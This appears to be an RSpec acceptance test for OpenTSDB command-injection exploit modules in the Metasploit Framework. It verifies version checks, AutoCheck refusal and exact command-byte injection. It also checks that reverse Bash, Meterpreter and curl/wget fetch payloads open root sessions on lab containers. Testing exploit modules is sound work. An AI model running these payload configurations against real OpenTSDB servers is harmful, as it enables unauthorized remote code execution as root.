require 'acceptance_spec_helper'
require 'base64'
require 'rex/parser/arguments'
require 'shellwords'
require 'timeout'

profile = ENV.fetch('OPENTSDB_PROFILE', 'yrange')
raise ArgumentError, 'Unknown OpenTSDB profile' unless %w[yrange yrange_fixed key key_fixed].include?(profile)

RSpec.describe 'Genuine OpenTSDB graph execution targets' do
  include_context 'module target'
  include_context 'wait_for_expect'

  let(:fixed) { profile.end_with?('_fixed') }
  let(:family) { profile.split('_').first }
  let(:owner) { "exploit/linux/http/opentsdb_#{family}_cmd_injection" }

  before(:all) do
    argv = ['python3', '-B', 'test/module_targets/opentsdb/native_probe.py']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-opentsdb-result.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-opentsdb-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    @native = JSON.parse(stdout)
    expect(@native.fetch('status')).to eq('passed')
    code = "load 'test/module_targets/opentsdb/input_audit.rb'; puts 'OPENTSDB_CATALOG='+OpenTsdbInputs.install(framework, #{listener_host.inspect}).to_json"
    output = console_command("irb -e #{code.inspect}")
    @catalog = JSON.parse(output[/^OPENTSDB_CATALOG=(\{.*\})\r?$/, 1])
  end

  before do
    expect(console_command('sessions -l')).to include('No active sessions')
    expect(console_command('jobs -l')).to include('No active jobs')
    @before_files = temporary_files
    @before_java = java_processes
    @input_offset = executing_inputs.length
  end

  after do
    console_command('sessions -K') unless @opentsdb_console_broken
    console_command('jobs -K') unless @opentsdb_console_broken
    next unless @before_files

    current = temporary_files
    added = current - @before_files
    append('opentsdb-operator-files', paths: added)
    added.each { |path| target_exec('affected', 'rm', '-f', '--', path) }
    expect(temporary_files).to eq(@before_files)
    expect(java_processes).to eq(@before_java)
  end

  if profile.end_with?('_fixed')
    %w[affected gateway].each do |service|
      it "reports the genuine #{service} version as safe twice" do
        2.times do
          output = invoke(service, {}, action: 'check')
          category = fixed ? 'The target is not exploitable.' : 'The target appears to be vulnerable.'
          expect(output).to include(category, "The target is OpenTSDB version #{@native.fetch('version').fetch('version')}")
        end
      end

      it "does not execute forced #{service} commands twice" do
        2.times do
          with_proof do |path|
            output = invoke(service, command_options("/usr/bin/touch #{path}").merge('AutoCheck' => false), allow_errors: true)
            expect(output).not_to match(/session \d+ opened/)
            expect_no_proof(path)
          end
        end
      end
    end

    it 'honors AutoCheck refusal twice without executing a command' do
      2.times do
        with_proof do |path|
          output = invoke('affected', command_options("/usr/bin/touch #{path}").merge('AutoCheck' => true), allow_errors: true)
          expect(output).to include('The target is not exploitable')
          expect(target_exec('affected', 'sh', '-c', "if test -e #{path}; then printf exists; fi")).to eq('')
        end
      end
      expect(executing_inputs.length).to eq(@input_offset)
    end

    it 'rejects unrelated real Apache twice' do
      2.times { expect(invoke('unrelated', {}, action: 'check')).to include('Target is not an OpenTSDB application.') }
    end
  else
    %w[affected gateway].each do |service|
      it "checks the genuine #{service} version twice" do
        2.times do
          output = invoke(service, {}, action: 'check')
          category = fixed ? 'The target is not exploitable.' : 'The target appears to be vulnerable.'
          expect(output).to include(category, "The target is OpenTSDB version #{@native.fetch('version').fetch('version')}")
        end
      end
    end

    [nil, 'incorrect-password'].each do |password|
      it "rejects #{password || 'absent credentials'} during a gateway check twice" do
        options = password ? { 'HttpPassword' => password } : { 'HttpUsername' => '', 'HttpPassword' => '' }
        2.times { expect(invoke('gateway', options, action: 'check')).to include('Target is not an OpenTSDB application.') }
      end

      it "refuses exploitation with #{password || 'absent credentials'} twice" do
        options = password ? { 'HttpPassword' => password } : { 'HttpUsername' => '', 'HttpPassword' => '' }
        2.times do
          with_proof do |path|
            output = invoke('gateway', command_options("/usr/bin/touch #{path}").merge(options).merge('AutoCheck' => true), allow_errors: true)
            expect(output).to include('The target is not exploitable')
            expect(target_exec('affected', 'sh', '-c', "if test -e #{path}; then printf exists; fi")).to eq('')
          end
        end
      end
    end

    it 'rejects unrelated real Apache twice' do
      2.times { expect(invoke('unrelated', {}, action: 'check')).to include('Target is not an OpenTSDB application.') }
    end

    it 'rejects the real missing base path twice' do
      2.times { expect(invoke('affected', { 'TARGETURI' => '/module-target-missing/' }, action: 'check')).to include('Target is not an OpenTSDB application.') }
    end

    it 'returns unknown for a closed owned endpoint twice' do
      2.times { expect(invoke('affected', { 'RPORT' => 4243 }, action: 'check', allow_errors: true)).to include('Connection failed.') }
    end

    {
      'simple' => 'Module target exact bytes', 'quotes' => "single' and \"double\" quotes",
      'backslash' => 'backslash\\tpath\\\\tail', 'plus' => 'literal + >>> $HOME; spaces',
      'chmod' => 'literal chmod +x; echo end'
    }.each do |label, value|
      it "preserves exact #{label} command bytes twice" do
        2.times { command_twice_body('affected', value) }
      end
    end

    it 'executes exact commands through the authenticated prefix twice' do
      2.times { command_twice_body('gateway', 'Prefix exact + $HOME; spaces') }
    end

    if profile == 'yrange'
      it 'opens and uses Unix Bash shells twice with AutoCheck' do
        sessions_twice('cmd/unix/reverse_bash', 'TARGET' => 0, 'AutoCheck' => true)
      end

      it 'opens and uses Linux x64 Meterpreter through curl twice' do
        sessions_twice('linux/x64/meterpreter/reverse_tcp', 'TARGET' => 1, 'CMDSTAGER::FLAVOR' => 'curl')
      end

      it 'opens and uses Linux x86 shells through Bourne twice' do
        sessions_twice('linux/x86/shell_reverse_tcp', 'TARGET' => 1, 'CMDSTAGER::FLAVOR' => 'bourne')
      end

      it 'executes Linux x86 commands through wget twice' do
        2.times do
          with_proof do |path|
            invoke('affected', { 'TARGET' => 1, 'PAYLOAD' => 'linux/x86/exec', 'CMD' => "/usr/bin/touch #{path}", 'CMDSTAGER::FLAVOR' => 'wget', 'AutoCheck' => false, 'DisablePayloadHandler' => true, 'WfsDelay' => 0, 'SRVHOST' => listener_host, 'SRVPORT' => 8082 })
            wait_for_proof(path, '')
          end
        end
      end
    else
      it 'opens and uses default Fetch curl Meterpreter twice' do
        expect(@catalog.fetch(owner).fetch('default_payload')).to eq('cmd/linux/http/x64/meterpreter/reverse_tcp')
        sessions_twice('cmd/linux/http/x64/meterpreter/reverse_tcp', 'FETCH_COMMAND' => 'CURL')
      end

      it 'opens and uses Fetch wget shells with requested file deletion twice' do
        sessions_twice('cmd/linux/http/x64/shell_reverse_tcp', 'FETCH_COMMAND' => 'WGET', 'FETCH_DELETE' => true)
      end

      it 'opens and uses Unix Bash shells twice with AutoCheck' do
        sessions_twice('cmd/unix/reverse_bash', 'AutoCheck' => true)
      end
    end
  end

  def invoke(service, options = {}, action: 'run -z', allow_errors: false)
    values = { 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true, 'TARGETURI' => '/' }
    values.merge!('TARGETURI' => '/tsdb/', 'HttpUsername' => 'module-test-user', 'HttpPassword' => 'module-test-password') if service == 'gateway'
    output = run_target_module(owner, service, values.merge(options), action: action, allow_errors: allow_errors, command_timeout: 90)
    expect(output).not_to match(/Unknown datastore option|NoMethodError|NameError|TypeError|ArgumentError|RuntimeError/)
    output
  end

  def command_options(command)
    { 'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => command, 'DisablePayloadHandler' => true, 'WfsDelay' => 0 }
  end

  def command_twice_body(service, value)
    with_proof do |path|
      command = "printf %s #{Shellwords.escape(value)} > #{path}"
      offset = executing_inputs.length
      invoke(service, command_options(command).merge('AutoCheck' => false))
      inputs = executing_inputs.drop(offset)
      expect(inputs.length).to eq(1)
      expect(Base64.strict_decode64(inputs.first.fetch('datastore_command'))).to eq(command)
      expect(Base64.strict_decode64(inputs.first.fetch('command'))).to eq(command)
      wait_for_proof(path, value)
    end
  end

  def wait_until(&block)
    Timeout.timeout(25) { wait_for_expect(1000, 0.1, &block) }
  end

  def with_proof
    path = '/tmp/module-target-opentsdb-proof'
    target_exec('affected', 'test', '!', '-e', path)
    yield path
    target_exec('affected', 'rm', '-f', '--', path)
    target_exec('affected', 'test', '!', '-e', path)
  ensure
    target_exec('affected', 'rm', '-f', '--', path) if path
  end

  def expect_no_proof(path)
    deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + 2
    wait_until do
      expect(target_exec('affected', 'sh', '-c', "if test -e #{path}; then printf exists; fi")).to eq('')
      expect(Process.clock_gettime(Process::CLOCK_MONOTONIC)).to be >= deadline
    end
  end

  def wait_for_proof(path, value)
    wait_until do
      expect(target_exec('affected', 'sh', '-c', "if test -f #{path}; then stat -c '%u:%g' #{path}; cat #{path}; fi")).to eq("0:0\n#{value}")
    end
  end

  def sessions_twice(payload, options)
    2.times do
      with_proof do |path|
        before = session_ids
        offset = console.all_data.bytesize
        values = {
          'TARGET' => 0, 'PAYLOAD' => payload, 'AutoCheck' => false, 'WfsDelay' => 10,
          'LHOST' => listener_host, 'LPORT' => 4444, 'SRVHOST' => listener_host, 'SRVPORT' => 8082,
          'DisablePayloadHandler' => false
        }
        if payload.start_with?('cmd/linux/')
          values.merge!('FETCH_SRVHOST' => listener_host, 'FETCH_SRVPORT' => 8083, 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => 'module-target-opentsdb-fetch')
        end
        output = invoke('affected', values.merge(options))
        identifier = nil
        wait_until do
          console_command('sessions -l')
          fresh = console.all_data.byteslice(offset..)
          opened = fresh.scan(/(?:Command shell|Meterpreter) session (\d+) opened/).flatten.map(&:to_i)
          created = (session_ids - before) & opened
          expect(created.length).to eq(1), output
          identifier = created.first
        end
        meterpreter = payload.include?('meterpreter')
        command = meterpreter ? "execute -f /usr/bin/touch -a #{path}" : "id; printf 'OPENTSDB_REMOTE_PID=%s\\n' $$; /usr/bin/touch #{path}"
        result = console_command("sessions -i #{identifier} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
        expect(result).not_to match(/\[-\]|Exception|Unknown command/)
        expect(result).to include('uid=0(root)') unless meterpreter
        wait_for_proof(path, '')
        pid_output = meterpreter ? console_command("sessions -i #{identifier} -C getpid") : result
        remote_pid = pid_output[meterpreter ? /Current pid:\s*(\d+)/i : /OPENTSDB_REMOTE_PID=(\d+)/, 1]
        expect(remote_pid).not_to be_nil, pid_output
        target_exec('affected', 'test', '-d', "/proc/#{remote_pid}")
        append('opentsdb-used-session', payload: payload, session: identifier, remote_pid: remote_pid, proof: result)
        console_command('sessions -K')
        console_command('jobs -K')
        wait_until { expect(target_exec('affected', 'sh', '-c', "if test -d /proc/#{remote_pid}; then printf alive; fi")).to eq('') }
        if payload.start_with?('cmd/linux/')
          if options['FETCH_DELETE']
            wait_until { expect(target_exec('affected', 'sh', '-c', 'if test -e /tmp/module-target-opentsdb-fetch; then printf exists; fi')).to eq('') }
          else
            append('opentsdb-operator-fetch-artifact', checksum: target_exec('affected', 'sha256sum', '/tmp/module-target-opentsdb-fetch'))
            target_exec('affected', 'rm', '--', '/tmp/module-target-opentsdb-fetch')
          end
        end
        expect(temporary_files).to eq((@before_files + [path]).sort)
        prove_ports_removed
      end
    end
  end

  def session_ids
    output = console_command(%q{irb -e 'puts "OPENTSDB_SESSIONS="+JSON.generate(framework.sessions.keys)'})
    JSON.parse(output[/^OPENTSDB_SESSIONS=(\[.*\])\r?$/, 1])
  end

  def prove_ports_removed
    code = 'require "json"; puts JSON.generate(%w[/proc/net/tcp /proc/net/tcp6].flat_map { |path| File.readlines(path).drop(1).map(&:split) }.select { |row| row[3]=="0A" && [4444,8082,8083].include?(row[1].split(":").last.to_i(16)) })'
    wait_until { expect(JSON.parse(target_exec('framework', 'ruby', '-e', code))).to eq([]) }
  end

  def temporary_files
    target_exec('affected', 'find', '/tmp', '-maxdepth', '1', '-type', 'f', '-printf', '%p\n').lines.map(&:strip).sort
  end

  def java_processes
    target_exec('affected', 'sh', '-c', 'for path in /proc/[0-9]*/comm; do read -r name < "$path" || continue; if [ "$name" = java ]; then printf "%s " "$path"; tr "\\000" " " < "${path%/comm}/cmdline"; printf "\\n"; fi; done').lines.sort
  end

  def executing_inputs
    path = File.join(target_runtime.fetch('artifacts'), 'opentsdb-executing-inputs.jsonl')
    File.file?(path) ? File.readlines(path).map { |line| JSON.parse(line) } : []
  end

  def append(name, values)
    File.open(File.join(target_runtime.fetch('artifacts'), "#{name}.jsonl"), 'a') { |file| file.puts(JSON.generate(values)) }
  end
end

# Family-local lexer and acknowledgement guards preserve literal command bytes.
module OpenTsdbConsoleControls
  def format_datastore_options(datastore)
    return super unless datastore.key?('CMD')

    command = datastore.fetch('CMD')
    rendered = "CMD=#{Shellwords.escape(command)}"
    expect(Rex::Parser::Arguments.from_s(rendered)).to eq(["CMD=#{command}"])
    "#{super(datastore.except('CMD'))} #{rendered}"
  end

  def console_command(command, timeout: 40)
    raise ArgumentError, 'Console command must occupy one line' if command.match?(/[\r\n]/)
    raise Acceptance::ChildProcessTimeoutError, 'OpenTSDB console transport failed' if @opentsdb_console_broken

    Timeout.timeout(timeout) do
      output = super
      @opentsdb_sequence = (@opentsdb_sequence || 0) + 1
      marker = "OPENTSDB_ACK_#{Process.pid}_#{@opentsdb_sequence}"
      console.sendline("irb -e #{"puts #{marker.inspect}".inspect}")
      acknowledged = console.recvuntil(/^#{Regexp.escape(marker)}\r?\n/, timeout: timeout)
      raise Acceptance::ChildProcessRecvError, 'Console ended before acknowledgement' unless acknowledged

      prompt = console.recvuntil(Acceptance::Console.prompt, timeout: timeout)
      raise Acceptance::ChildProcessRecvError, 'Console ended after acknowledgement' unless prompt

      output + acknowledged + prompt
    end
  rescue Timeout::Error, Acceptance::ChildProcessTimeoutError, Acceptance::ChildProcessRecvError, EOFError, Errno::EPIPE
    @opentsdb_console_broken = true
    RSpec.world.wants_to_quit = true
    raise
  end
end

RSpec.world.example_groups.find { |group| group.description == 'Genuine OpenTSDB graph execution targets' }.prepend(OpenTsdbConsoleControls)
